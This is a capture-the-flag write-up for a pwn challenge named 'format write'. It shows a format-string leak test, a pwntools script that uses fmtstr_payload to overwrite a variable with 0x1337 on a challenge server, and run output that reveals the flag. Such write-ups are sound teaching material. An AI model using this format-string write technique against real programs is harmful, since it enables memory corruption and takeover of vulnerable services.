# Access Denied: Pwn/Write

## Question 

As you read till now. you have to write now.

server: nc 107.178.209.165 5337

[format_write](format_write.bin)

## Solution

We see the program suffers a ``format write`` vulnerability.

```
$./format_write.bin 
Enter your name: %6$pAAAABBBB
0x4141414170243625AAAABBBB
```

We can use this to satisfy the conditions to print the flag by writing ``0x1337`` to ``val``.

```python
from pwn import *

binary = args.BIN

context.terminal = ["tmux", "splitw", "-h"]
e = context.binary = ELF(binary)
r = ROP(e)

gs = '''
continue
'''

def start():
    if args.GDB:
        return gdb.debug(e.path, gdbscript=gs)
    elif args.REMOTE:
        return remote('107.178.209.165',5337)
    else:
        return process(e.path)


p = start()

val = e.sym['val']
desired_val= 0x1337

payload_writes = {
         val : desired_val,
}

payload = fmtstr_payload(6,payload_writes,write_size='short')
p.sendline(payload)
p.interactive()

```

Running our script yields the flag 

```
$ python3 pwn-format.py BIN=./format_write.bin REMOTE
[*] '/root/workspace/access_denied/format-write/format_write.bin'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[*] Loaded 14 cached gadgets for './format_write.bin'
[+] Opening connection to 107.178.209.165 on port 5337: Done
[*] Switching to interactive mode
Enter your name:                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       paaaal@@accessdenied{f0rm4t_str1n9_wr1t3s_ar3_t00_g00d_6126758a}

paaaal@@accessdenied{f0rm4t_str1n9_wr1t3s_ar3_t00_g00d_6126758a}
```
